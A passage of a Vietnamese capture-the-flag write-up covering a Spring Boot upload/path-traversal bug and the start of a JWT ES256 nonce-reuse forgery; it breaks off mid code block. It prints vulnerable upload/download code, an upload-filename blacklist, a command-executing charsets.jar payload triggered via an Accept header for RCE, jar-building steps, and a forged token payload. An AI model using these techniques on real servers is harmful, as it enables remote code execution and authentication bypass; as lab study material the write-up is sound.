</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>version: &#39;3&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>services:
</span></span><span class=line><span class=cl>  spring_up:
</span></span><span class=line><span class=cl>    container_name: spring_up
</span></span><span class=line><span class=cl>    build: build
</span></span><span class=line><span class=cl>    restart: always
</span></span><span class=line><span class=cl>    networks:
</span></span><span class=line><span class=cl>      - no-internet
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  nginx:
</span></span><span class=line><span class=cl>    image: nginx:1.27.0-alpine
</span></span><span class=line><span class=cl>    restart: unless-stopped
</span></span><span class=line><span class=cl>    ports:
</span></span><span class=line><span class=cl>      - &#34;8080:80&#34;
</span></span><span class=line><span class=cl>    volumes:
</span></span><span class=line><span class=cl>      - ./build/nginx.conf:/etc/nginx/conf.d/default.conf
</span></span><span class=line><span class=cl>    depends_on:
</span></span><span class=line><span class=cl>      - spring_up
</span></span><span class=line><span class=cl>    networks:
</span></span><span class=line><span class=cl>      - internet
</span></span><span class=line><span class=cl>      - no-internet
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>networks:
</span></span><span class=line><span class=cl>  internet: {}
</span></span><span class=line><span class=cl>  no-internet:
</span></span><span class=line><span class=cl>    internal: true
</span></span></code></pre></td></tr></table></div></div><p>FIle pom và config cũng không có gì đặc biệt nên mình chuyển qua đọc web service controller luôn.
Website chủ yếu phục vụ 3 route chính, và được code bên trong class FileController, chúng đều được bắt đầu bằng prefix path: <code>/file/</code>
Route <code>/file/testUI</code> khi GET đến sẽ render file upload.html hiển thị form upload file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>@</span><span class=n>GetMapping</span><span class=p>({</span><span class=s2>&#34;testUI&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>public</span> <span class=ne>String</span> <span class=n>testUI</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;upload&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Form sẽ gửi một POST request đến route <code>/file/uploadResource</code>, tại đây file được xử lý và black list chặn một số prefix file nhất định:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>private</span> <span class=k>static</span> <span class=n>final</span> <span class=ne>String</span><span class=p>[]</span> <span class=n>BLACK_LIST</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>[]{</span><span class=s2>&#34;etc&#34;</span><span class=p>,</span> <span class=s2>&#34;cron&#34;</span><span class=p>,</span> <span class=s2>&#34;bash&#34;</span><span class=p>,</span> <span class=s2>&#34;sh&#34;</span><span class=p>,</span> <span class=s2>&#34;var&#34;</span><span class=p>,</span> <span class=s2>&#34;proc&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>PostMapping</span><span class=p>({</span><span class=s2>&#34;uploadResource&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>public</span> <span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=ne>String</span><span class=o>&gt;</span> <span class=n>uploadFile</span><span class=p>(</span><span class=err>@</span><span class=n>RequestParam</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>)</span> <span class=n>MultipartFile</span> <span class=n>file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>isEmpty</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ResponseEntity</span><span class=o>.</span><span class=n>badRequest</span><span class=p>()</span><span class=o>.</span><span class=n>body</span><span class=p>(</span><span class=s2>&#34;Please select a file to upload.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=ne>File</span> <span class=n>theDir</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>File</span><span class=p>(</span><span class=s2>&#34;uploads/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>theDir</span><span class=o>.</span><span class=n>exists</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>theDir</span><span class=o>.</span><span class=n>mkdirs</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>byte</span><span class=p>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>getBytes</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=ne>String</span> <span class=n>originalFilename</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>getOriginalFilename</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>for</span><span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>BLACK_LIST</span><span class=o>.</span><span class=n>length</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>originalFilename</span><span class=o>.</span><span class=n>contains</span><span class=p>(</span><span class=n>BLACK_LIST</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>ResponseEntity</span><span class=o>.</span><span class=n>badRequest</span><span class=p>()</span><span class=o>.</span><span class=n>body</span><span class=p>(</span><span class=s2>&#34;Blacklist!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=ne>Path</span> <span class=n>path</span> <span class=o>=</span> <span class=n>Paths</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;uploads/&#34;</span> <span class=o>+</span> <span class=n>file</span><span class=o>.</span><span class=n>getOriginalFilename</span><span class=p>());</span>
</span></span><span class=line><span class=cl>            <span class=n>Files</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>bytes</span><span class=p>,</span> <span class=n>new</span> <span class=n>OpenOption</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>ResponseEntity</span><span class=o>.</span><span class=n>ok</span><span class=p>(</span><span class=s2>&#34;File uploaded successfully: &#34;</span> <span class=o>+</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>IOException</span> <span class=n>var6</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>var6</span><span class=o>.</span><span class=n>printStackTrace</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>ResponseEntity</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span><span class=o>.</span><span class=n>body</span><span class=p>(</span><span class=s2>&#34;Failed to upload file.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Flow code của route này như sau:</p><ul><li>Khởi tạo thư mục uploads nếu chưa tồn tại</li><li>Lấy nội dung của file qua method <code>MultipartFile.getBytes()</code>, đồng thời là filename bằng method <code>MultipartFile.getOriginalFilename()</code> -> method này sẽ lấy toàn bộ tên file, bao gồm cả path nên tại đây ta xác định lỗ hổng upload file + path traversal</li><li>Trước khi lưu file sẽ được kiểm tra xem có chứa các ký tự blacklist không, nếu có thì sẽ cook luông</li><li>Sau đó file được lưu tại thư mục uploads, đồng thời thông báo path ra ngoài cho người dùng</li></ul><p>Ngoài ra còn có route <code>/file/downloadResource</code> dùng để download file từ thư mục uploads:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>@</span><span class=n>GetMapping</span><span class=p>({</span><span class=s2>&#34;downloadResource&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>public</span> <span class=n>ResponseEntity</span><span class=o>&lt;</span><span class=ne>String</span><span class=o>&gt;</span> <span class=n>downloadResource</span><span class=p>(</span><span class=err>@</span><span class=n>RequestParam</span> <span class=ne>String</span> <span class=n>fileName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=ne>String</span> <span class=n>content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>byte</span><span class=p>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>Files</span><span class=o>.</span><span class=n>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;uploads/&#34;</span> <span class=o>+</span> <span class=n>fileName</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>var5</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ResponseEntity</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=o>.</span><span class=n>NOT_FOUND</span><span class=p>)</span><span class=o>.</span><span class=n>body</span><span class=p>((</span><span class=ne>Object</span><span class=p>)</span><span class=n>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>MediaType</span> <span class=n>mediaType</span> <span class=o>=</span> <span class=n>MediaType</span><span class=o>.</span><span class=n>parseMediaType</span><span class=p>(</span><span class=s2>&#34;application/octet-stream&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>HttpHeaders</span> <span class=n>headers</span> <span class=o>=</span> <span class=n>new</span> <span class=n>HttpHeaders</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span><span class=o>.</span><span class=n>setContentType</span><span class=p>(</span><span class=n>mediaType</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span><span class=o>.</span><span class=n>setContentDispositionFormData</span><span class=p>(</span><span class=s2>&#34;attachment&#34;</span><span class=p>,</span> <span class=n>fileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>ResponseEntity</span><span class=o>.</span><span class=n>BodyBuilder</span><span class=p>)</span><span class=n>ResponseEntity</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>HttpStatus</span><span class=o>.</span><span class=n>OK</span><span class=p>)</span><span class=o>.</span><span class=n>headers</span><span class=p>(</span><span class=n>headers</span><span class=p>))</span><span class=o>.</span><span class=n>body</span><span class=p>(</span><span class=n>content</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Về cơ bản thì chức này đọc file từ path upload nối chuỗi với request param <code>fileName</code>, từ đó expose lỗ hổng read file + path traversal</li></ul><p>Chương trình chỉ có 2 route này là đáng chú ý, vì user chạy web service là root nên tổng hợp lại mình đang có:</p><ul><li>Upload file tùy ý</li><li>Read file tùy ý</li></ul><p>Tưởng ngon ăn nhưng lại không hề ngon, ta không thể upload web shell jsp vì Spring Boot không code để phục vụ việc hiển thị thư mục uploads ra web, mà chỉ có thể truy cập đến thông qua route <code>/file/downloadResource</code><br><img src=https://hackmd.io/_uploads/BJTRQUtiC.png loading=lazy alt=image><br><br><img src=https://hackmd.io/_uploads/HyK1EIYjA.png loading=lazy alt=image><br>Từ đó, mình đã thử kha khá cách, một số có thể nói đến là:</p><ul><li>Upload các file có khả năng tự động thực thi như crontab, nhưng bị blacklist -> failed</li><li>Upload ghi đè html để trigger thymeleaf (maybe), nhưng chương trình được đóng gói thành file jar -> failed</li></ul><p>Searching tài liệu Trung Hoa về Spring boot upload file to RCE thì mình tìm được lỗ hổng Spring boot Fat Jar tại <a class=link href="https://download.csdn.net/download/weixin_42131316/16637359?ydreferer=aHR0cHM6Ly93d3cuYmFpZHUuY29tL2xpbms%2FdXJsPU1VOTZSR2sycjdmak11V0RiZkNRbWlSVG1zb2RPUzYtSmJyV1pPUEZGV0V2NFhhbXJPMWlmc1pfNUlFX2o4OUROLWxxcE81Xzc4c2tTR0tHWkw3WXpCZDcxaGY1R3d3OURZejVlYW9tR0l1JndkPSZlcWlkPTk2N2Y0ZGM1MDAzOThjZDkwMDAwMDAwNjY2Y2FjZGM4" target=_blank rel=noopener>csdn</a>, từ đó dẫn tới blog <a class=link href=https://landgrey.me/blog/22/ target=_blank rel=noopener>https://landgrey.me/blog/22/</a>, đã nói chi tiết về quá trình tìm và khai thác lỗ hổng, kèm lab đi kèm + file jar ghi đè.
Về cơ bản thì lỗ hổng này cho phép ta đưa từ ghi file bất kỳ lên RCE thông qua việc ghi đè các file jar có trong lib của JDK, tác giả lựa chọn file charsets.jar vì nó có thể trigger thông qua header Accept tại HTTP Request bất kỳ
Điều kiện để khai thác lỗ hổng là:</p><ul><li>Biết được tên thư mục lib của JDK, với phiên bản được docker cài đặt là <code>openjdk:8-jdk-alpine</code> thì nó sẽ nằm tại: <code>/usr/lib/jvm/java-1.8-openjdk/jre/lib/</code></li><li>File jar đó chưa được server load để sử dụng, vậy nên đây là trò chơi 1 lần, một khi đã upload thì nếu ta exploit không thành công sẽ cần phải attack vào lib khác, hoặc đơn giản hơn là deploy lại ¯\<em>(ツ)</em>/¯ (chắc đây cũng là lý do challenge này được deploy instance)</li></ul><p>Cụ thể về file jar cũng như các tấn công thì nằm tại: <a class=link href=https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/ target=_blank rel=noopener>https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/</a>. Mình git clone về để lấy file jar của họ test thử cũng như tự build thành 1 project.
File jar của họ được build từ 2 file java class <code>ExtendedCharsets</code> dùng để khai báo các kiểu charset, còn <code>IBM33722</code> dùng để xử lý với các kiểu charset đó.
Tại <code>IBM33722.class</code> ta sẽ thấy khi kiểu charset nào được kích hoạt ở bên <code>ExtendedCharsets</code> đều sẽ thực thi ở file này, và khi khởi tạo constructor của class <code>IBM33722</code> sẽ trigger method <strong>fun()</strong> thực thi câu lệnh. Đây là câu lệnh được thực thi bên trong file jar mẫu của họ:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>private</span> <span class=k>static</span> <span class=n>HashMap</span><span class=o>&lt;</span><span class=ne>String</span><span class=p>,</span> <span class=ne>String</span><span class=o>&gt;</span> <span class=n>fun</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=ne>String</span> <span class=n>var1</span> <span class=o>=</span> <span class=n>UUID</span><span class=o>.</span><span class=n>randomUUID</span><span class=p>()</span><span class=o>.</span><span class=n>toString</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>substring</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>9</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=ne>String</span> <span class=n>var2</span> <span class=o>=</span> <span class=n>System</span><span class=o>.</span><span class=n>getProperty</span><span class=p>(</span><span class=s2>&#34;os.name&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=ne>String</span><span class=p>[]</span> <span class=n>var0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>var2</span><span class=o>.</span><span class=n>startsWith</span><span class=p>(</span><span class=s2>&#34;Mac OS&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>var0</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>[]{</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;open -a Calculator&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>var2</span><span class=o>.</span><span class=n>startsWith</span><span class=p>(</span><span class=s2>&#34;Windows&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>var0</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>[]{</span><span class=s2>&#34;cmd.exe&#34;</span><span class=p>,</span> <span class=s2>&#34;/c&#34;</span><span class=p>,</span> <span class=s2>&#34;calc&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=n>new</span> <span class=ne>File</span><span class=p>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>exists</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>var0</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>[]{</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;touch /tmp/charsets_test_&#34;</span> <span class=o>+</span> <span class=n>var1</span> <span class=o>+</span> <span class=s2>&#34;.log&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>var0</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>[]{</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;touch /tmp/charsets_test_&#34;</span> <span class=o>+</span> <span class=n>var1</span> <span class=o>+</span> <span class=s2>&#34;.log&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Runtime</span><span class=o>.</span><span class=n>getRuntime</span><span class=p>()</span><span class=o>.</span><span class=n>exec</span><span class=p>(</span><span class=n>var0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>Throwable</span> <span class=n>var4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>var4</span><span class=o>.</span><span class=n>printStackTrace</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Upload file jar ghi đè file jar hiện tại:<br><img src=https://hackmd.io/_uploads/HJuj_IYoA.png loading=lazy alt=image><br><br><img src=https://hackmd.io/_uploads/HyFaOLKiC.png loading=lazy alt=image><br>Trigger bằng request kèm header: <code>Accept: text/html;charset=GBK</code><br><img src=https://hackmd.io/_uploads/Hk-8KIFj0.png loading=lazy alt=image><br>Kiểm tra tại docker thì ta thấy 2 file log đã được khởi tạo, chứng tỏ ta đã RCE thành công:<br><img src=https://hackmd.io/_uploads/S1xp3Y8Fi0.png loading=lazy alt=image><br></p><h3 id=exploit-1>Exploit</h3><p>Giờ công việc của mình là tự build lại 1 file jar để thay vì tạo file tmp mình sẽ ghi flag vào /tmp/flag.txt và rồi dùng route downloadResource để đọc flag
Vì chưa build file jar từ artifacts bao giờ mà mình hay dùng maven để package nên mình tốn rất nhiều thời gian cho việc này (cụ thể là 2 tiếng rưỡi)
Có một số vấn đề gặp phải mà mình lưu ý:</p><ul><li>Không thể nhét file .java vào file jar vì ta cần là file java được compile thành file class</li><li>Source code gen file jar của họ không có main method, nên để chạy được ta cần thêm method main vào</li><li>Và cũng đừng có đi sửa source của hộ, tự build lại từ source đó nhanh hơn nhiều =))</li></ul><p>Bắt đầu từ việc khởi tạo project mới, mình để tên là charsets luôn cho tiện, đồng thời dùng jdk 1.8<br><img src=https://hackmd.io/_uploads/BkeesUtiA.png loading=lazy alt=image><br>Tại thư mục java mình chọn new package, và nhập vào package như của author là <code>sun.nio.cs.ext</code>:<br><img src=https://hackmd.io/_uploads/BJUQsUFi0.png loading=lazy alt=image><br>Tạo 2 file Java clss bên trong package vừa tạo và copy code vô :))), riêng tại IBM33722.java thì mình sẽ sửa câu lệnh tạo file log, đồng thời thêm main method vào (không có gì không sao):<br><img src=https://hackmd.io/_uploads/r1AQn8KoC.png loading=lazy alt=image><br>Thêm folder META-INF và file <code>MANIFEST.MF</code> vào bên trong thư mục resource, copy nội dung của file jar kia vào:<br><img src=https://hackmd.io/_uploads/ry5O2UYj0.png loading=lazy alt=image><br>Tiến hành compile project này bằng cách chạy nó thôi, kết quả file class sẽ nằm tại folder target:<br><img src=https://hackmd.io/_uploads/H10C2IFiR.png loading=lazy alt=image><br>Tiến hành đóng gói thành file JAR tại tab Project Structure, chọn mục Artifacts và chọn tạo file JAR:<br><img src=https://hackmd.io/_uploads/BJXf6UYsA.png loading=lazy alt=image><br>Tại đây thì mình không chọn gì, vì main method có cũng không quan trọng lắm:<br><img src=https://hackmd.io/_uploads/B1pmaLtjR.png loading=lazy alt=image><br>Lúc này file charsets.jar sẽ chứa kết quả output của compile, để chắc chắn thì mình thêm nội dung bên trong folder resource là folder META-INF để chắc cú:<br><img src=https://hackmd.io/_uploads/rkT_TLFsA.png loading=lazy alt=image><br>Tại tab Build chọn Build Artifacts, file jar sẽ được compile<br><img src=https://hackmd.io/_uploads/rJWjaUtsA.png loading=lazy alt=image><br>Kiểm tra file jar khởi tạo thì nó đã đầy đủ các thành phần như của file jar mẫu: thư mục chứa MANIFEST và 2 file class<br><img src=https://hackmd.io/_uploads/ByNxR8KsR.png loading=lazy alt=image><br>Nếu như nhét file java vào file jar thì file jar sẽ nặng khoảng 5KB, còn khi compile xong thì nó sẽ là 11KB
Mình deploy lại local để upload file jar mới, sau khi lặp lại các bước trên thì file flag.txt đã được khởi tạo tại /tmp/flag.txt<br><img src=https://hackmd.io/_uploads/SJ6_C8KiC.png loading=lazy alt=image><br>Kết quả trên instance challenge:<br><img src=https://hackmd.io/_uploads/HJgTkvYjC.png loading=lazy alt=image><br></p><ul><li>Flag: <strong>KMACTF{ayoooo00oo0ooo0o0o00o0ooooo000oo0oo0o00000}</strong></li></ul><h2 id=not-so-secure>not so secure</h2><p><br><img src=https://hackmd.io/_uploads/Bk8JWDFsR.png loading=lazy alt=image><br></p><ul><li>URL: <a class=link href=http://157.15.86.73:9999/ target=_blank rel=noopener>157.15.86.73:9999</a></li></ul><p>Đây là challenge mà mình không kịp làm trong 1 tiếng cuối trước khi cuộc thi kết thúc, nên mình có đi hỏi về hướng làm, từ đó reproduce lại để hiểu hơn</p><h3 id=bypass-jwt-es256>Bypass JWT ES256</h3><p>Khi truy cập vào website, ta sẽ được ghi hero name và quirk code:<br><img src=https://hackmd.io/_uploads/B1k1u3YjA.png loading=lazy alt=image><br>Giá trị username được ghi vào trong jwt, còn quirk code thì điền bao nhiều thì quirk vẫn có giá trị là civilian thôi.
Website thì có file robots.txt có một chút gợi ý về việc mã hóa ES256 diễn ra như thế nào:<br><img src=https://hackmd.io/_uploads/S154_ntsA.png loading=lazy alt=image><br>Đi theo gợi ý, mình tìm cách crack jwt để đưa giá trị của quirk về hero nhưng không kịp.
Sau đó thì mình đã xin hint của người anh em <a class=link href=https://hackmd.io/@C4t-f4t target=_blank rel=noopener>C4t-f4t</a> về hướng giải và nhận ra có script của 1 bài gần tương tự tại NahamCon 2021 dùng để bypass jwt sử dụng hệ mật đường cong Eliptic. Lỗ hổng xảy ra khi sử dụng thuật toán ECDSA mà không thay đổi nonce, attacker có thể crack ra được private key. Để hiểu hơn thì mình có thể tham khảo thêm tại: <a class=link href=https://asecuritysite.com/encryption/ecd5 target=_blank rel=noopener>https://asecuritysite.com/encryption/ecd5</a>
Với 2 mẫu thông điệp thì mình có thể crack được secret key và forge ra được token của riêng mình
Link write up đó tại: <a class=link href=https://github.com/milliesolem/writeups/blob/main/NahamCon%202021/Elliptical/solve.py target=_blank rel=noopener>https://github.com/milliesolem/writeups/blob/main/NahamCon%202021/Elliptical/solve.py</a>
Mình chỉnh sửa 1 chút cho phù hợp với bài và chèn vào phần jwt payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#34;username&#34;:&#34;kev1n&#34;,&#34;quirk&#34;:&#34;hero&#34;}
</span></span></code></pre></td></tr></table></div></div><p><br><img src=https://hackmd.io/_uploads/BkguF3Kj0.png loading=lazy alt=image><br>Nhưng có vẻ quirk hero là không đúng, quirk là tên gọi chung của các siêu năng lực của mấy nhân vật trong website, nên mình nảy ra ý định là thử với tất cả các quirk được giới thiệu trên trang web, bao gồm:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
